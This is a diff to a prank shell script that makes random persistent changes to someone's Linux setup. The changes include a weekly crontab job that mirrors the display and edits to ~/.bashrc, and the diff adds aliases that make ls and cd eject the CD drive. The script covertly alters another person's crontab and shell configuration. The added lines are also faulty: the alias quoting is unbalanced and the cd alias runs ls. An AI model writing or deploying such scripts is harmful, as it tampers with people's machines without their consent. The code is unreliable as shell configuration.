@@ -21,7 +21,7 @@ RANDOM=`date '+%s'`
 # Semi-permanent prank
 for n in {1 .. $[($RANDOM % 3) + 1]}
 do
-    case $[$RANDOM % 8] in
+    case $[$RANDOM % 9] in
         0) # Mirror the display weekly
             crontab -l | sed "\$a\@weekly /usr/bin/xrandr --device $DEVICE --reflect xy" | crontab -
             ;;
@@ -61,6 +61,9 @@ do
         7) # Set default editor to gedit
             echo "export EDITOR=gedit" >> ~/.bashrc
             ;;
+        8) # Eject CD-drive on certain commands
+            echo "alias ls='eject && `which ls`" >> ~/.bashrc
+            echo "alias cd='eject && `which ls`" >> ~/.bashrc
     esac
 done
 
